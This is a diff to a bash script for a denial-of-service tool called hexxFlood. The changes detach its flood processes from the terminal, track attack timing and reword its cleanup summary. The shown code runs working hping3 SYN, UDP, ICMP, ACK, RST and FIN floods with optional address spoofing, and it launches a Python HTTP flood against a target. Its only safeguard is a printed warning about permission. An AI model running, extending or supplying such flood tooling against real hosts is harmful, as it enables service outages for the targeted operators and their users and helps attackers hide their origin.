@@ -228,9 +228,9 @@ print("HTTP flood stopped")
 PYEOF
 
     if [ -f "/opt/hexxFlood-venv/bin/python" ]; then
-        /opt/hexxFlood-venv/bin/python /tmp/http_flood.py "$url" "$threads" "$duration" </dev/null >/dev/null 2>&1 &
+        $DETACH /opt/hexxFlood-venv/bin/python /tmp/http_flood.py "$url" "$threads" "$duration" </dev/null >/dev/null 2>&1 &
     else
-        python3 /tmp/http_flood.py "$url" "$threads" "$duration" </dev/null >/dev/null 2>&1 &
+        $DETACH python3 /tmp/http_flood.py "$url" "$threads" "$duration" </dev/null >/dev/null 2>&1 &
     fi
 }
 
@@ -441,11 +441,11 @@ get_packet_count() {
 }
 
 monitor_attack() {
-    local start_time=$(date +%s)
+    # Reuse the baseline captured in main() (set before launch) so the timer and
+    # packet totals count from the real attack start; fall back if unset.
+    local start_time=${ATTACK_START_TIME:-$(date +%s)}
+    local initial_packets=${ATTACK_INITIAL_PACKETS:-$(get_packet_count)}
     local duration=$ATTACK_DURATION
-    local initial_packets=$(get_packet_count)
-
-    # Expose to cleanup() so Ctrl+C can print a proper final summary
     ATTACK_START_TIME=$start_time
     ATTACK_INITIAL_PACKETS=$initial_packets
 
@@ -540,29 +540,34 @@ cleanup() {
     heavy=$(printf '━%.0s' $(seq 1 "$cols"))
     light=$(printf '─%.0s' $(seq 1 "$cols"))
 
+    # Print each line with an explicit carriage return (\r\n). This guarantees
+    # every line starts at column 0 even if a killed child left the TTY in raw
+    # mode — so the summary is always left-aligned, never "staircased".
+    pl() { printf '%b\r\n' "$1"; }
+
     # Structured summary appended BELOW the existing output (nothing is cleared,
     # so the full attack view stays visible and the stats land at the very end).
-    echo ""
-    echo ""
-    echo -e "${CYAN}${heavy}${NC}"
-    echo -e "   ${YELLOW}🛑  hexxFlood — Attack Stopped${NC}"
-    echo -e "${CYAN}${heavy}${NC}"
-    echo ""
-    echo -e "   ${GREEN}✔${NC}  hping3 flood processes terminated"
-    echo -e "   ${GREEN}✔${NC}  HTTP flood terminated"
-    echo -e "   ${GREEN}✔${NC}  Temporary files removed"
-    echo ""
+    pl ""
+    pl ""
+    pl "${CYAN}${heavy}${NC}"
+    pl "   ${YELLOW}🛑  hexxFlood — Attack Stopped${NC}"
+    pl "${CYAN}${heavy}${NC}"
+    pl ""
+    pl "   ${GREEN}✔${NC}  hping3 flood processes terminated"
+    pl "   ${GREEN}✔${NC}  HTTP flood terminated"
+    pl "   ${GREEN}✔${NC}  Temporary files removed"
+    pl ""
     if [ -n "${ATTACK_START_TIME:-}" ]; then
-        echo -e "   ${YELLOW}📊 Final Statistics${NC}"
-        echo -e "      Total Packets Sent : ${GREEN}$(printf "%'d" "$total")${NC}"
-        echo -e "      Total Time         : ${GREEN}${elapsed}s${NC}"
-        echo -e "      Average PPS        : ${GREEN}$(printf "%'d" "$avg")${NC}"
-        echo ""
+        pl "   ${YELLOW}📊 Final Statistics${NC}"
+        pl "      Total Packets Sent : ${GREEN}$(printf "%'d" "$total")${NC}"
+        pl "      Total Attack Time  : ${GREEN}${elapsed}s${NC}"
+        pl "      Average PPS        : ${GREEN}$(printf "%'d" "$avg")${NC}"
+        pl ""
     fi
-    echo -e "${CYAN}${light}${NC}"
-    echo -e "   ${GREEN}✅ Cleanup complete.${NC}  Stay ethical. 👋"
-    echo -e "${CYAN}${light}${NC}"
-    echo ""
+    pl "${CYAN}${light}${NC}"
+    pl "   ${GREEN}✅ Cleanup complete.${NC}  Stay ethical. 👋"
+    pl "${CYAN}${light}${NC}"
+    pl ""
     exit 0
 }
 
@@ -607,6 +612,16 @@ main() {
     echo -e "${RED}⚠️ WARNING: Use only on networks you OWN or have permission to test!${NC}"
     echo ""
 
+    # Baseline for the final summary — captured BEFORE any launch so a Ctrl+C
+    # during startup still reports total packets / time / PPS.
+    ATTACK_START_TIME=$(date +%s)
+    ATTACK_INITIAL_PACKETS=$(get_packet_count)
+
+    # Fully detach flood children from the controlling terminal so they can't
+    # put it into raw mode (the "staircase" bug). setsid gives them their own
+    # session with no controlling tty; fall back gracefully if unavailable.
+    DETACH="setsid"; command -v setsid >/dev/null 2>&1 || DETACH=""
+
     # Auto-open monitor terminal(s) so progress is visible while the attack runs
     launch_monitors
 
@@ -644,12 +659,12 @@ main() {
         for i in $(seq 1 $THREADS); do
             for type in $(echo "$ATTACK_TYPES" | tr ',' ' '); do
                 case $type in
-                    syn) for p in $TCP_PORTS; do sudo hping3 -S --flood $SPOOF_FLAG -p ${PP}$p -d $PACKET_SIZE -i $DELAY $TARGET </dev/null >/dev/null 2>&1 & done ;;
-                    udp) for p in $UDP_PORTS; do sudo hping3 -2 --flood $SPOOF_FLAG -p ${PP}$p -d $PACKET_SIZE -i $DELAY $TARGET </dev/null >/dev/null 2>&1 & done ;;
-                    icmp) sudo hping3 -1 --flood $SPOOF_FLAG -d $PACKET_SIZE -i $DELAY $TARGET </dev/null >/dev/null 2>&1 & ;;
-                    ack) for p in $TCP_PORTS; do sudo hping3 -A --flood $SPOOF_FLAG -p ${PP}$p -d $PACKET_SIZE -i $DELAY $TARGET </dev/null >/dev/null 2>&1 & done ;;
-                    rst) for p in $TCP_PORTS; do sudo hping3 -R --flood $SPOOF_FLAG -p ${PP}$p -d $PACKET_SIZE -i $DELAY $TARGET </dev/null >/dev/null 2>&1 & done ;;
-                    fin) for p in $TCP_PORTS; do sudo hping3 -F --flood $SPOOF_FLAG -p ${PP}$p -d $PACKET_SIZE -i $DELAY $TARGET </dev/null >/dev/null 2>&1 & done ;;
+                    syn) for p in $TCP_PORTS; do sudo $DETACH hping3 -S --flood $SPOOF_FLAG -p ${PP}$p -d $PACKET_SIZE -i $DELAY $TARGET </dev/null >/dev/null 2>&1 & done ;;
+                    udp) for p in $UDP_PORTS; do sudo $DETACH hping3 -2 --flood $SPOOF_FLAG -p ${PP}$p -d $PACKET_SIZE -i $DELAY $TARGET </dev/null >/dev/null 2>&1 & done ;;
+                    icmp) sudo $DETACH hping3 -1 --flood $SPOOF_FLAG -d $PACKET_SIZE -i $DELAY $TARGET </dev/null >/dev/null 2>&1 & ;;
+                    ack) for p in $TCP_PORTS; do sudo $DETACH hping3 -A --flood $SPOOF_FLAG -p ${PP}$p -d $PACKET_SIZE -i $DELAY $TARGET </dev/null >/dev/null 2>&1 & done ;;
+                    rst) for p in $TCP_PORTS; do sudo $DETACH hping3 -R --flood $SPOOF_FLAG -p ${PP}$p -d $PACKET_SIZE -i $DELAY $TARGET </dev/null >/dev/null 2>&1 & done ;;
+                    fin) for p in $TCP_PORTS; do sudo $DETACH hping3 -F --flood $SPOOF_FLAG -p ${PP}$p -d $PACKET_SIZE -i $DELAY $TARGET </dev/null >/dev/null 2>&1 & done ;;
                 esac
             done
         done
